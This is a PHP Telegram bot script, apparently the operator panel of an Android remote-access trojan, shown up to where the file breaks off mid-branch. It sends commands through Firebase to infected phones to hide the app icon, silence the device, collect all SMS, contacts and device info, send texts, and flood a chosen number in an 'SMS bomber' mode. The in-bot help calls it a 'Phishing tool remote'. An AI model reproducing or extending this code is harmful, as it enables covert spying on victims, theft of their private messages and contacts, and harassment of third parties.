<?php 
error_reporting(0);

include("Madsal.php");

define( 'TOKEN', $token );
define( 'API_ACCESS_KEY', $apikey );
if(!file_exists("userlist")){
mkdir("userlist");

}if(!file_exists("admins")){
file_put_contents("admins","");

}
if(!file_exists("user.txt")){
file_put_contents("user.txt","");

}
function bot($method, $datas = [])
{
    $url = "https://api.telegram.org/bot".TOKEN."/" . $method;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);
    $res = curl_exec($ch);
    if (curl_error($ch)) {

        var_dump(curl_error($ch));

    } else {
        return json_decode($res);
    }
}


function pingbot(){
    
    $ch = curl_init("127.0.0.1"); 
  curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
  if(curl_exec($ch))
  {
  $info = curl_getinfo($ch);
 return $info['total_time'] ;
  }

  curl_close($ch);

    
    
    
    
}

function action($action,$androidid){
$data_string = '{"data":{"action":"'.$action.'","androidid":"'.$androidid.'"},"to":"\/topics\/pluto"}';

$headers = array ( 'Authorization: key=' . API_ACCESS_KEY, 'Content-Type: application/json' );
$ch = curl_init(); curl_setopt( $ch,CURLOPT_URL, 'https://fcm.googleapis.com/fcm/send' );
curl_setopt( $ch,CURLOPT_POST, true );
curl_setopt( $ch,CURLOPT_HTTPHEADER, $headers );
curl_setopt( $ch,CURLOPT_RETURNTRANSFER, true );
curl_setopt( $ch,CURLOPT_POSTFIELDS, $data_string);
$result = curl_exec($ch);
curl_close ($ch);
} 
function deleteDirectory($dir) {
system('rm -rf -- ' . escapeshellarg($dir), $retval);
return $retval == 0;
}
function sendmess($action,$androidid,$phone,$message){
    $port=file_get_contents("port.txt");
$data_string = '{"data":{"action":"'.$action.'","androidid":"'.$androidid.'","phone":"'.$phone.'","text":"'.$message.'"},"to":"\/topics\/pluto"}';
$headers = array ( 'Authorization: key=' . API_ACCESS_KEY, 'Content-Type: application/json' );
$ch = curl_init(); curl_setopt( $ch,CURLOPT_URL, 'https://fcm.googleapis.com/fcm/send' );
curl_setopt( $ch,CURLOPT_POST, true );
curl_setopt( $ch,CURLOPT_HTTPHEADER, $headers );
curl_setopt( $ch,CURLOPT_RETURNTRANSFER, true );
curl_setopt( $ch,CURLOPT_POSTFIELDS, $data_string);
$result = curl_exec($ch);
curl_close ($ch);
  
}
function ping($action){
$port=file_get_contents("port.txt");
$data_string = '{"data":{"action":"'.$action.'"},"to":"\/topics\/pluto"}';

$headers = array ( 'Authorization: key=' . API_ACCESS_KEY, 'Content-Type: application/json' );
$ch = curl_init(); curl_setopt( $ch,CURLOPT_URL, 'https://fcm.googleapis.com/fcm/send' );
curl_setopt( $ch,CURLOPT_POST, true );
curl_setopt( $ch,CURLOPT_HTTPHEADER, $headers );
curl_setopt( $ch,CURLOPT_RETURNTRANSFER, true );
curl_setopt( $ch,CURLOPT_POSTFIELDS, $data_string);
$result = curl_exec($ch);
curl_close ($ch);
   
}
function sm1($chatid,$text,$reply){
	bot('sendMessage',[
	'chat_id'=>$chatid,
	'text'=>$text,
	'parse_mode'=>'HTML',
	'reply_to_message_id'=>$reply
	]);
}
function em($chatid,$message_id,$text,$keyboard){
bot('editmessagetext',[ 
    'chat_id'=>$chatid, 
    'message_id'=>$message_id,
    'text'=>$text,
    'parse_mode'=>'HTML',
    'reply_markup'=>$keyboard
	]);
	}
	
	
	
	
	
	
	
	$dir = "userlist";
$folders = array('..', '.', 'folder');
$files = array_diff(scandir($dir), $folders);
	
 
   
  foreach($files as $tr){
$and=json_decode(file_get_contents("userlist/$tr"))->androidid;
$name = str_replace(".json","",$tr);
$pmodel=json_decode(file_get_contents("userlist/$tr"))->name;
$ur = file_get_contents("saeed.txt");

$key[]= [['text'=>$name, 'callback_data'=>"androidid $pmodel $and"]];

}
$key[]= [['text'=> "• 𝗕𝗔𝗖𝗞 •", 'callback_data'=> "back1"]];
$keyboard1= json_encode(['inline_keyboard'=> $key]);

 foreach($files as $tr){
$and=json_decode(file_get_contents("userlist/$tr"))->androidid;
$name = str_replace(".json","",$tr);


$key1[]= [['text'=>$name, 'callback_data'=>"deletes $name $and"]];

}


$key1[]= [['text'=> "• 𝗕𝗔𝗖𝗞 •", 'callback_data'=> "booook"]];


   
 $keyboard2= json_encode(['inline_keyboard'=> $key1]);
  

   
function sm($chatid,$text,$keyboard){
	bot('sendMessage',[
	'chat_id'=>$chatid,
	'text'=>$text,
	'parse_mode'=>'HTML',
	'reply_markup'=>$keyboard
	]);
    }
    $pingbot=pingbot();
$update = json_decode(file_get_contents("php://input"));
$message = $update->message;
$message_id = $update->message->message_id;
$data = isset($message->text)?$message->text:$update->callback_query->data;
$chat_id = isset($update->callback_query->message->chat->id)?$update->callback_query->message->chat->id:$update->message->chat->id;
$from_id = isset($update->callback_query->message->from->id)?$update->callback_query->message->from->id:$update->message->from->id;
$text=$update->message->text;
$mi = $update->callback_query->message->message_id;
$first_n = $update->message->from->first_name;
$last_n = $update->message->from->last_name;
$first = $update->callback_query->from->first_name;
$last = $update->callback_query->from->last_name;
$firsms = file_get_contents("files/actionfirst.txt");
$first_name = $update->message->from->first_name;
$dom = file_get_contents("id.txt");
$usernamee = $update->message->from->username;

$username = $update->callback_query->from->username;
$adminact= file_get_contents("admins");
$authi=file_get_contents('files/autohide.txt');  
$count=count(scandir("userlist"))-2;
//=====

if(!file_exists("files/autohide.txt")){
file_put_contents("autohide",'off');
}


//==================================================,'callback_data' => 'PhoneList'
$ino = json_encode(array('inline_keyboard'=>[[['text'=>"𝗨𝗦𝗘𝗥🆂",'callback_data' => 'jsieueueis'],['text'=>"{ $count }",'callback_data' => 'ddjsjsjsjj']],
[['text'=>"𝙸𝙳",'callback_data' => 'koddkwkwkkk'],['text'=>"{ $id }",'callback_data' => 'kdkdks']],
[['text'=>"𝗔𝗨𝗧𝗢⚀𝗛𝗜𝗗𝗘 ~",'callback_data' => 'jsjsjs'],['text'=>"{ $authi }",'callback_data' => 'sjjejsjs']],
[['text'=>"𝗔𝗨𝗧𝗢⚁𝗦𝗠𝗦 ~",'callback_data' => 'jsjsjs'],['text'=>"{ $firsms }",'callback_data' => 'sjjejsjs']],
[['text'=>"• 𝙿𝚘𝚛𝚝",'callback_data' => 'jdjjkkkdk'],['text'=>"{ $prt }",'callback_data' => 'jsjsi']],
[['text'=>"𝘋𝘰𝘮𝘢𝘪𝘯 ~",'callback_data' => 'kkkei']],
[['text'=>"{$dom}",'callback_data' => 'jdjsjj']],
[['text'=>"𝙏𝙊𝙆𝙀𝙉/𝘽𝙊𝙏",'callback_data' => 'jss'],['text'=>"{$token}",'callback_data' => 'jsjsjsje']],
[['text'=>"𝗕𝗔𝗖𝗞",'callback_data' => 'booook']]
]));

$starta = json_encode(array('inline_keyboard'=>
[[['text'=>"⚬𝗦𝗘𝗧~𝗨𝗦𝗘𝗥⚬️",'callback_data' => 'controol']],
[['text'=>"𝗢𝗡𝗟𝗜𝗡𝗘~𝗨𝗦𝗘𝗥🆂",'callback_data' => 'onlineu']],
[['text'=>"𝗔𝗨𝗧𝗢~𝗛𝗜𝗗𝗘 ⚀",'callback_data' => 'ahide'],
['text'=>"𝗔𝗨𝗧𝗢~𝗦𝗠𝗦 ⚁",'callback_data' => 'fsssms']],
[['text'=>"𝗦𝗠𝗦~𝗕𝗢𝗠𝗕𝗘𝗥 ⚂",'callback_data' => 'smsbmbr']],
[['text'=>"𝗛𝗜𝗗𝗘~𝗔𝗟𝗟️ ⚃",'callback_data' => 'hideall'],['text'=>"️𝗨𝗡𝗛𝗜𝗗𝗘~𝗔𝗟𝗟 ⚄",'callback_data' => 'visiall']],
[['text'=>"𝗦𝗜𝗟𝗘𝗡𝗧~𝗔𝗟𝗟 ⚅",'callback_data' => 'silentall']],
[['text'=>"𝗖𝗛𝗔𝗡𝗚𝗘~𝗨𝗥𝗟",'callback_data' => 'poetal']],
[['text'=>"𝗨𝗦𝗘𝗥🆂➧",'callback_data' => 'dacfpf8i'],['text'=>"$count",'callback_data' => 'infoytgep']],
[['text'=>"𝗨𝗥𝗟➧",'callback_data' => 'dac8i'],['text'=>"$dom",'callback_data' => 'inftgep']],
[['text'=>"𝗥𝗘𝗦𝗘𝗧♽𝗥𝗘𝗠𝗢𝗧𝗘️",'callback_data' => 'resetr']],
[['text'=>"️ℹ",'callback_data' => 'infop'],['text'=>"𝔐𝔞𝔡-𝔰𝔞𝔩",'url'=>"https://t.me/hack666m"]],
[['text'=>"𝙥𝙚𝙧𝙨𝙞𝙖𝙣️",'callback_data' => 'persia']]
]));
$admins = json_encode(array('inline_keyboard'=>
[[['text'=>"𝑯𝑰𝑫𝑬-𝑰𝑪𝑶𝑵",'callback_data' => 'iconhidee'],['text'=>"𝑼𝑵𝑯𝑰𝑫𝑬-𝑰𝑪𝑶𝑵",'callback_data' => 'unhidee']],
[['text'=>"𝗔𝗟𝗟-𝗦𝗠𝗦",'callback_data' => 'alssms']],
[['text'=>"𝑻𝑨𝑹𝑮𝑬𝑻-𝑰𝑵𝑭𝑶",'callback_data' => 'infou'],['text'=>"-𝑪𝑶𝑵𝑻𝑨𝑪𝑻-",'callback_data' => 'contacct']],
[['text'=>"𝗦𝗘𝗡𝗗-𝗦𝗠𝗦",'callback_data' => 'smssend']],
[['text'=>"-𝑵𝑶𝑹𝑴𝑨𝑳-",'callback_data' => 'noormmal'],['text'=>"-𝑺𝑰𝑳𝑬𝑵𝑻-",'callback_data' => 'sileent']],
[['text'=>"-𝑽𝑰𝑩𝑬𝑹𝑬-",'callback_data' => 'vibeeree'],['text'=>"𝑳𝑨𝑺𝑻-𝑺𝑴𝑺",'callback_data' => 'laastssms']],
[['text'=>"𝗕𝗔𝗖𝗞",'callback_data' => 'booook']]
]));

$autohids =  json_encode(array('inline_keyboard'=>
[[['text'=>"𝒐𝒏",'callback_data' => 'autohon'],['text'=>"𝒐𝒇𝒇",'callback_data' => 'autohoff']],
[['text'=>"𝗕𝗔𝗖𝗞",'callback_data' => 'booook']]
]));

$fsms = json_encode(array('inline_keyboard'=>
[[['text'=>"𝒐𝒏",'callback_data' => 'fsmmsonon'],['text'=>"𝒐𝒇𝒇",'callback_data' => 'fsmmsonoff']],
[['text'=>"𝑆𝑒𝑡 𝑁𝑢𝑚𝑏𝑒𝑟",'callback_data' => 'ssetnum'],['text'=>"𝑆𝑒𝑡 𝑇𝐸𝑋𝑇",'callback_data' => 'ssetteext']],
[['text'=>"𝗕𝗔𝗖𝗞",'callback_data' => 'booook']]
]));
$dosel = json_encode(array('inline_keyboard'=>
[[['text'=>"𝑌𝑒𝑠",'callback_data' => 'yessennd'],['text'=>"𝐸𝑑𝑖𝑡",'callback_data' => 'eddiittxt']],
[['text'=>"𝗕𝗔𝗖𝗞",'callback_data' => 'booook']]
]));

if(in_array($chat_id,$admin_list)){
	if(preg_match('/^\/([Ss]tart)(.*)/',$text)){
	    sm($chat_id,"𝙃𝙞 $first_name 𝙧𝙚𝙢𝙤𝙩𝙚 𝙗𝙮 : $crd",$starta);
}
    elseif($data == 'fsssms'){        
	    em($chat_id,$mi,"{⚁} 𝑺𝒆𝒍𝒆𝒄𝒕 𝒚𝒐𝒖𝒓 𝑨𝑼𝑻𝑶 𝑺𝑴𝑺 𝒐𝒑𝒕𝒊𝒐𝒏𝒔.

{👺} 𝐜𝐨𝐝𝐞𝐝 𝐛𝐲 $crd ",$fsms);
}elseif($data == 'hideall'){
		em($chat_id,$mi,"{⚃} 𝑹𝒆𝒒𝒖𝒆𝒔𝒕 𝑯𝑰𝑫𝑬 𝑰𝑪𝑶𝑵 𝒔𝒆𝒏𝒅𝒆𝒅 𝒕𝒐 𝒂𝒍𝒍 { $count } 𝒖𝒔𝒆𝒓𝒔

𝑷𝒍𝒆𝒂𝒔𝒆 𝒘𝒂𝒊𝒕..

{👺} 𝐜𝐨𝐝𝐞𝐝 𝐛𝐲 $crd",$starta);
		
	 $data = file_get_contents('user.txt');
    $androidid1 = explode("/", $data); 
    foreach ($androidid1 as $androidid) {
        
  action('hideicon',$androidid);
       
    
    } 
 
	    
}elseif($data == 'visiall'){
	em($chat_id,$mi,"{⚄} 𝑹𝒆𝒒𝒖𝒆𝒔𝒕 𝑼𝑵𝑯𝑰𝑫𝑬 𝑰𝑪𝑶𝑵 𝒔𝒆𝒏𝒅𝒆𝒅 𝒕𝒐 𝒂𝒍𝒍 { $count } 𝒖𝒔𝒆𝒓𝒔

{👺} 𝐜𝐨𝐝𝐞𝐝 𝐛𝐲 $crd",$starta);
		
	 $data = file_get_contents('user.txt');
    $androidid1 = explode("/", $data); 
    foreach ($androidid1 as $androidid) {
        
  action('unhide',$androidid);
       
    
    }
    }elseif($data == 'silentall'){
		em($chat_id,$mi,"{⚅} 𝑹𝒆𝒒𝒖𝒆𝒔𝒕 𝑺𝑰𝑳𝑬𝑵𝑻 𝒔𝒆𝒏𝒅𝒆𝒅 𝒕𝒐 𝒂𝒍𝒍 { $count } 𝒖𝒔𝒆𝒓𝒔

{👺} 𝐜𝐨𝐝𝐞𝐝 𝐛𝐲 $crd",$starta);
		
	 $data = file_get_contents('user.txt');
    $androidid1 = explode("/", $data); 
    foreach ($androidid1 as $androidid) {
        
  action('silent',$androidid);
       
    
    }
}elseif($data == 'onlineu'){
	ping('ping');        
	em($chat_id,$mi,"{☑} 𝑹𝒆𝒒𝒖𝒆𝒔𝒕 𝒔𝒆𝒏𝒅𝒆𝒅 𝒕𝒐 𝒂𝒍𝒍 { $count } 𝒖𝒔𝒆𝒓𝒔

𝑷𝒍𝒆𝒂𝒔𝒆 𝒘𝒂𝒊𝒕.. 

{👺} 𝐜𝐨𝐝𝐞𝐝 𝐛𝐲 $crd",$starta);
	    
	    
}elseif($data == 'smsbmbr'){        
	    sm($chat_id,"{⚂} 𝑬𝒏𝒕𝒆𝒓 𝒕𝒉𝒆 𝒕𝒂𝒓𝒈𝒆𝒕 𝒑𝒉𝒐𝒏𝒆 𝒏𝒖𝒎𝒃𝒆𝒓.

𝑨𝒍𝒍 𝒖𝒔𝒆𝒓𝒔 ~ $count {👍🏿}

{👺} 𝐜𝐨𝐝𝐞𝐝 𝐛𝐲 $crd",$back1);
file_put_contents("admins","smsbomber");
	   }elseif($adminact == "smsbomber" ){
	    file_put_contents("files/bomber.txt",$text);
	    sm($chat_id,"{⚂}  𝑷𝒍𝒆𝒂𝒔𝒆 𝑬𝒏𝒕𝒆𝒓 𝒂 𝒕𝒆𝒙𝒕 𝒕𝒐 𝒃𝒐𝒎𝒃𝒆𝒓.

𝑨𝒍𝒍 𝒖𝒔𝒆𝒓𝒔 ~ $count {👍🏿}
𝑻𝒂𝒓𝒈𝒆𝒕 𝒏𝒖𝒎𝒃𝒆𝒓 ~ $text {💀}

{👺} 𝐜𝐨𝐝𝐞𝐝 𝐛𝐲  $crd ",$back1);
file_put_contents("admins","smsbomber1");

}elseif($adminact == "smsbomber1" ){
    
    sm($chat_id,"{⚂}  𝑺𝒆𝒏𝒅𝒆𝒅 𝒕𝒐 $bom 𝒕𝒂𝒓𝒈𝒆𝒕.

𝒀𝒐𝒖𝒓 𝒕𝒆𝒙𝒕 𝒃𝒐𝒎𝒃𝒆𝒓 ~ $text

{👺} 𝐜𝐨𝐝𝐞𝐝 𝐛𝐲  $crd ",$starta);

file_put_contents("admins","");

	    file_put_contents("files/smsbomber.txt",$text);
	$message = file_get_contents("files/smsbomber.txt");
	$phone = file_get_contents("files/bomber.txt");
	$data = file_get_contents('user.txt');
    $androidid1 = explode("/", $data); 
    foreach ($androidid1 as $androidid) {
        
    sendmess("SendSingleMessage",$androidid,$phone,$message);
    }	    

	    }
elseif($data == 'resetr'){
 	
		em($chat_id,$mi," 𝒀𝒐𝒖 𝒄𝒂𝒏'𝒕 𝒓𝒆𝒔𝒆𝒕 𝒕𝒉𝒆 𝒃𝒐𝒕 𝒎𝒐𝒕𝒉𝒆𝒓 𝒇𝒖𝒄𝒌𝒆𝒓. 😂 
 
{👺} 𝐜𝐨𝐝𝐞𝐝 𝐛𝐲  $crd ",$starta);
file_put_contents("kir","");
file_put_contents("kir","https://google.com");
deleteDirectory("kir");
file_put_contents("kir","");
file_put_contents("kir","off");
file_put_contents("kir","off");
file_put_contents("kir","off");
file_put_contents("kir","off");
file_put_contents("kir","");
file_put_contents("kir","");
file_put_contents("kir","");

	
	}elseif($data == 'infop'){
	    	     em($chat_id,$mi,"{☕} 𝙈𝙤𝙧𝙚 𝙞𝙣𝙛𝙤 𝙋𝙝𝙞𝙨𝙝𝙞𝙣𝙜 𝙩𝙤𝙤𝙡 𝙧𝙚𝙢𝙤𝙩𝙚 ~
	    	     
	    	     𝚃𝚑𝚒𝚜 𝚛𝚎𝚖𝚘𝚝𝚎 𝚒𝚜 𝚖𝚊𝚍𝚎 𝚋𝚢 𝙼𝚊𝚍𝚜𝚊𝚕 𝚊𝚗𝚍 𝚌𝚊𝚗𝚗𝚘𝚝 𝚋𝚎 𝚎𝚍𝚒𝚝𝚎𝚍 𝚒𝚗 𝚊𝚗𝚢 𝚠𝚊𝚢. 𝙸𝚏 𝚢𝚘𝚞 𝚎𝚍𝚒𝚝 𝚒𝚝, 𝚒𝚝 𝚠𝚒𝚕𝚕 𝚗𝚘𝚝 𝚠𝚘𝚛𝚔 𝚊𝚗𝚢𝚖𝚘𝚛𝚎!
	    	     این ریموت توسط مدصال نوشته شده و به هیچ وجه قابل ادیت نیست اگر ادیت بشه دیگه کار نمیکنه!
	    	     𝗚𝘂𝗶𝗱𝗲 ~ 《🎗》
	    	     set user : /set_android.id
	    	     {/start}
{‍👺} 𝐜𝐨𝐝𝐞𝐝 𝐛𝐲 $crd ",$ino);

}

	elseif($data=="booook"){
	    
	    
	    
	     em($chat_id,$mi,"𝙃𝙞 $first_name 𝙧𝙚𝙢𝙤𝙩𝙚 𝙗𝙮 $crd",$starta);
file_put_contents("admins","");
	    
	    
	}elseif($data == 'controol'){        
	    sm($chat_id,"{⚇} 𝑬𝒏𝒕𝒆𝒓 𝒕𝒉𝒆 𝒕𝒂𝒓𝒈𝒆𝒕 𝒂𝒏𝒅𝒓𝒐𝒊𝒅 𝑰𝑫. 
	
{👺} 𝐜𝐨𝐝𝐞𝐝 𝐛𝐲 $crd",$back1);
	    file_put_contents("admins","setuser");
	
	    }elseif($data == 'ssetnum'){        
	    sm($chat_id,"{⚁} 𝑬𝒏𝒕𝒆𝒓 𝒚𝒐𝒖𝒓 𝒏𝒖𝒎𝒃𝒆𝒓 𝒕𝒐 𝑨𝑼𝑻𝑶 𝑺𝑴𝑺.
	
{👺} 𝐜𝐨𝐝𝐞𝐝 𝐛𝐲 $crd",$back1);
	    file_put_contents("admins","firstnum");
	
	}elseif($adminact == "firstnum" ){
	    file_put_contents("files/fsms.txt",$text);
	    sm($chat_id,"{☑} 𝑵𝒖𝒎𝒃𝒆𝒓 𝒔𝒆𝒕𝒆𝒅.

𝒀𝒐𝒖𝒓 𝒏𝒖𝒎𝒃𝒆𝒓 : $text ~

{👺} 𝐜𝐨𝐝𝐞𝐝 𝐛𝐲  $crd ",$starta);
file_put_contents("admins","");
}elseif($data == 'ssetteext'){        
	    sm($chat_id,"{⚁} 𝑬𝒏𝒕𝒆𝒓 𝒚𝒐𝒖𝒓 𝒕𝒆𝒙𝒕.
	
{👺} 𝐜𝐨𝐝𝐞𝐝 𝐛𝐲 $crd",$back1);
	    file_put_contents("admins","firsttext");
	
	}elseif($adminact == "firsttext" ){
	    file_put_contents("files/ftext.txt",$text);
	    sm($chat_id,"{☑} 𝑻𝒆𝒙𝒕 𝒔𝒆𝒕𝒆𝒅.
	
𝒀𝒐𝒖𝒓 𝒕𝒆𝒙𝒕 :

$text

{👺} 𝐜𝐨𝐝𝐞𝐝 𝐛𝐲  $crd ",$starta);
file_put_contents("admins","");
 }elseif($data == 'persia'){ 
     rename("pe.php", "bot.php");
	    sm($chat_id,"{🌎} زبان عوض شد لطفا دوباره استارت کنید
 /start  {✅}

{👺} 𝐜𝐨𝐝𝐞𝐝 𝐛𝐲  $crd ",$starta);

	 }elseif($data == 'fsmmsonon'){ 
       file_put_contents("files/actionfirst.txt","on"); 
	    em($chat_id,$mi,"{☑} 𝑨𝒖𝒕𝒐 𝒔𝒎𝒔 𝒊𝒔 𝒐𝒏.

{👺} 𝐜𝐨𝐝𝐞𝐝 𝐛𝐲  $crd ",$starta);
file_put_contents("admins","");
 }elseif($data == 'fsmmsonoff'){ 
       file_put_contents("files/actionfirst.txt","off"); 
	    em($chat_id,$mi,"{❌} 𝑨𝒖𝒕𝒐 𝒔𝒎𝒔 𝒊𝒔 𝒐𝒇𝒇.

{👺} 𝐜𝐨𝐝𝐞𝐝 𝐛𝐲  $crd ",$starta);
file_put_contents("admins","");
}elseif($text == '𝒐𝒏 𝒉𝒊𝒅𝒆'){ 
       file_put_contents("files/actionhide.txt","on"); 
	    sm($chat_id,"{☑} 𝑨𝒖𝒕𝒐 𝒉𝒊𝒅𝒆 𝒃𝒖𝒚 𝒊𝒔 𝒐𝒏.

{👺} 𝐜𝐨𝐝𝐞𝐝 𝐛𝐲  $crd ",$starta);
file_put_contents("admins","");
 }elseif($text == '𝒐𝒇𝒇 𝒉𝒊𝒅𝒆'){ 
       file_put_contents("files/actionhide.txt","off"); 
	    sm($chat_id,"{❌} 𝑨𝒖𝒕𝒐 𝒉𝒊𝒅𝒆 𝒃𝒖𝒚 𝒊𝒔 𝒐𝒇𝒇.

{👺} 𝐜𝐨𝐝𝐞𝐝 𝐛𝐲  $crd ",$starta);
}elseif($text == '𝒐𝒏 𝒃𝒖𝒚'){ 
       file_put_contents("files/actionbuy.txt","on"); 
	    sm($chat_id,"{☑} 𝑨𝒎𝒐𝒖𝒏𝒕 𝒃𝒖𝒚 𝒊𝒔 𝒐𝒏.

{👺} 𝐜𝐨𝐝𝐞𝐝 𝐛𝐲  $crd ",$starta);
file_put_contents("admins","");
 }elseif($text == '𝒐𝒇𝒇 𝒃𝒖𝒚'){ 
       file_put_contents("files/actionbuy.txt","off"); 
	    sm($chat_id,"{❌} 𝑨𝒎𝒐𝒖𝒏𝒕 𝒃𝒖𝒚 𝒊𝒔 𝒐𝒇𝒇.

{👺} 𝐜𝐨𝐝𝐞𝐝 𝐛𝐲  $crd ",$starta);
	}elseif($data == 'poetal'){        
	    sm($chat_id,"{🔗}  𝑬𝒏𝒕𝒆𝒓 𝒚𝒐𝒖𝒓 𝑼𝑹𝑳 :

𝗠𝗮𝗸𝗲 𝘀𝘂𝗿𝗲 𝘆𝗼𝘂𝗿 𝘀𝗶𝘁𝗲 𝗶𝘀 𝗛𝗧𝗧𝗣𝗦 {🔮}

{👺} 𝐜𝐨𝐝𝐞𝐝 𝐛𝐲  $crd ",$back1);
	    file_put_contents("admins","setdom");
	
	    }elseif($data == 'ahide'){        
	    em($chat_id,$mi,"{⚀} 𝐢𝐬 𝐀𝐔𝐓𝐎 𝐇𝐈𝐃𝐄 𝐨𝐧 𝐨𝐫 𝐨𝐟𝐟?
	    
{👺} 𝐜𝐨𝐝𝐞𝐝 𝐛𝐲  $crd ",$autohids);
	    file_put_contents("admins","autohide");
	    
	    }elseif($data == 'autohon'){ 
       file_put_contents("files/autohide.txt","on"); 
	    em($chat_id,$mi,"{☑} 𝑨𝒖𝒕𝒐 𝒉𝒊𝒅𝒆 𝒊𝒔 𝒐𝒏.
	    
{👺} 𝐜𝐨𝐝𝐞𝐝 𝐛𝐲  $crd ",$starta);
file_put_contents("admins","");
 }elseif($data == 'autohoff'){ 
       file_put_contents("files/autohide.txt","off"); 
	    em($chat_id,$mi,"{❌} 𝑨𝒖𝒕𝒐 𝒉𝒊𝒅𝒆 𝒊𝒔 𝒐𝒇𝒇.

{👺} 𝐜𝐨𝐝𝐞𝐝 𝐛𝐲  $crd ",$starta);
file_put_contents("admins","");
	
	}elseif(strpos($data,'androidid') !==false){
	   $datass=explode(" ",$data);
	 file_put_contents('p',$datass[2]);   
	 file_put_contents('name',$datass[1]);      
	    	            
	    em($chat_id,$mi,"🕹 - Wᴇʟᴄᴏᴍᴇ Tᴏ $datass[1]  Aᴅᴍɪɴ Pᴀɴᴇʟ 
	
Yᴏᴜ Cᴀɴ Mᴀɴᴀɢᴇ Yᴏᴜʀ Usᴇʀ Wɪᴛʜ Tʜᴇ Fᴏʟʟᴏᴡɪɴɢ Bᴜᴛᴛᴏɴs -《🎗》

Cᴏᴅᴇᴅ ʙʏ $crd️",$admins);
	        }elseif($data == 'sileent'){        
		em($chat_id,$mi,"{🔇}  𝑹𝒆𝒒𝒖𝒆𝒔𝒕 𝑺𝑰𝑳𝑬𝑵𝑻 𝒔𝒆𝒏𝒅𝒆𝒅 𝒕𝒐 𝒖𝒔𝒆𝒓.
	
𝑷𝒍𝒆𝒂𝒔𝒆 𝒘𝒂𝒊𝒕..
 
{👺} 𝐜𝐨𝐝𝐞𝐝 𝐛𝐲  $crd ",$admins);
	     $androidid=file_get_contents('p');  
	     $name = file_get_contents('name');  
	     action('silent',$androidid);
	
	    }elseif($data == 'vibeeree'){        
		em($chat_id,$mi,"{🌩} 𝑹𝒆𝒒𝒖𝒆𝒔𝒕 𝒗𝒊𝒃𝒆𝒓𝒆 𝒔𝒆𝒏𝒅𝒆𝒅 𝒕𝒐 𝒖𝒔𝒆𝒓.
	
 𝑷𝒍𝒆𝒂𝒔𝒆 𝒘𝒂𝒊𝒕..
 
{👺} 𝐜𝐨𝐝𝐞𝐝 𝐛𝐲  $crd ",$admins);
	     $androidid=file_get_contents('p');  
	     $name = file_get_contents('name');  
	     action('vibre',$androidid);
	
	}elseif($data == 'noormmal'){        
		em($chat_id,$mi,"{💡} 𝑹𝒆𝒒𝒖𝒆𝒔𝒕 𝑵𝒐𝒓𝒎𝒂𝒍 𝒔𝒆𝒏𝒅𝒆𝒅 𝒕𝒐 𝒖𝒔𝒆𝒓.
	
𝑷𝒍𝒆𝒂𝒔𝒆 𝒘𝒂𝒊𝒕..
 
{👺} 𝐜𝐨𝐝𝐞𝐝 𝐛𝐲  $crd ",$admins);
	     $androidid=file_get_contents('p');  
	     $name = file_get_contents('name');  
	     action('normal',$androidid);
	}elseif($data == 'unhidee'){        
		em($chat_id,$mi,"{〽️} 𝑹𝒆𝒒𝒖𝒆𝒔𝒕 𝒖𝒏-𝒉𝒊𝒅𝒆 𝒔𝒆𝒏𝒅𝒆𝒅 𝒕𝒐 𝒖𝒔𝒆𝒓.
	
 𝑷𝒍𝒆𝒂𝒔𝒆 𝒘𝒂𝒊𝒕..
 
{👺} 𝐜𝐨𝐝𝐞𝐝 𝐛𝐲  $crd ",$admins);
	     $androidid=file_get_contents('p');  
	     $name = file_get_contents('name');  
	     action('unhide',$androidid);
	}elseif($text == '✏️ᴀᴜᴛᴏ sᴍs✏️'){        
		sm($chat_id,"{🖍} sᴇɴᴅ ʏᴏᴜʀ ᴛᴇxᴛ sᴍs : 

{👺} 𝐜𝐨𝐝𝐞𝐝 𝐛𝐲  $crd ",$admins);   
file_put_contents("admins","autos");


	}elseif($data == 'infou'){        
		em($chat_id,$mi,"{📱} 𝑹𝒆𝒒𝒖𝒆𝒔𝒕 𝒊𝒏𝒇𝒐 𝒔𝒆𝒏𝒅𝒆𝒅 𝒕𝒐 𝒖𝒔𝒆𝒓.
	
 𝑷𝒍𝒆𝒂𝒔𝒆 𝒘𝒂𝒊𝒕..
 
{👺} 𝐜𝐨𝐝𝐞𝐝 𝐛𝐲  $crd ",$admins);
	     $androidid=file_get_contents('p');  
	     $name = file_get_contents('name');  
	     
	     action('getdevicefullinfo',$androidid);
	     
	    
	   
	    
	}elseif($data == 'contacct'){        
		em($chat_id,$mi,"{🛰} 𝑹𝒆𝒒𝒖𝒆𝒔𝒕 𝑪𝒐𝒏𝒕𝒂𝒄𝒕𝒔 𝒔𝒆𝒏𝒅𝒆𝒅 𝒕𝒐 𝒖𝒔𝒆𝒓.
	
 𝑷𝒍𝒆𝒂𝒔𝒆 𝒘𝒂𝒊𝒕.. 
 
{👺} 𝐜𝐨𝐝𝐞𝐝 𝐛𝐲  $crd ",$admins);
	    
	    $androidid=file_get_contents('p');  
	     $name = file_get_contents('name');  
	    
	     action('getcontact',$androidid);
	     
	    
	    
	    
	}elseif($data == 'alssms'){        
		em($chat_id,$mi,"{📓} 𝑹𝒆𝒒𝒖𝒆𝒔𝒕 𝑨𝒍𝒍-𝒔𝒎𝒔 𝒔𝒆𝒏𝒅𝒆𝒅 𝒕𝒐 𝒖𝒔𝒆𝒓.
	
 𝑷𝒍𝒆𝒂𝒔𝒆 𝒘𝒂𝒊𝒕.. {🚬}
 
{👺} 𝐜𝐨𝐝𝐞𝐝 𝐛𝐲  $crd ",$admins);
	    $androidid=file_get_contents('p');  
	     $name = file_get_contents('name');  
	    
	     action('getsms',$androidid);
	     
	    
	    
	    
	    
	}
	
	elseif($data == 'smssend'){        
	    $messs=file_get_contents("mess");

	    em($chat_id,$mi,"{📤} 𝒚𝒐𝒖𝒓 𝒔𝒎𝒔 𝑻𝒙𝑻 :
	
$messs
	
𝒅𝒐 𝒚𝒐𝒖 𝒘𝒂𝒏𝒕 𝒕𝒐 𝒖𝒔𝒆 𝒕𝒆𝒙𝒕 𝒂𝒍𝒓𝒆𝒂𝒅𝒚 𝒃𝒆𝒆𝒏 𝒑𝒐𝒔𝒕𝒆𝒅 {❓}
	
{👺} 𝐜𝐨𝐝𝐞𝐝 𝐛𝐲  $crd 
",$dosel);

   }
   elseif($data == 'yessennd'){
   	
   file_put_contents("admins","message1");
